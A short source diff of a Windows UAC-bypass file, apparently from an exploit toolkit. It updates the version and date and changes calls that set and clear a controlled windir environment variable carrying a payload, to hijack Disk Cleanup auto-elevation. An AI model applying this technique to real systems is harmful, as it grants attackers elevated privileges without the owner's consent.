@@ -4,9 +4,9 @@
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     2.76
+*  VERSION:     2.84
 *
-*  DATE:        12 July 2017
+*  DATE:        22 Nov 2017
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -66,7 +66,7 @@ BOOL ucmDiskCleanupEnvironmentVariable(
         //
         // Set our controlled env.variable with payload.
         //
-        if (!supSetEnvVariable(FALSE, T_WINDIR, szEnvVariable))
+        if (!supSetEnvVariable(FALSE, NULL, T_WINDIR, szEnvVariable))
             break;
 
         //
@@ -77,7 +77,7 @@ BOOL ucmDiskCleanupEnvironmentVariable(
         //
         // Cleaup our env.variable.
         //
-        supSetEnvVariable(TRUE, T_WINDIR, NULL);
+        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
 
     } while (bCond);
 
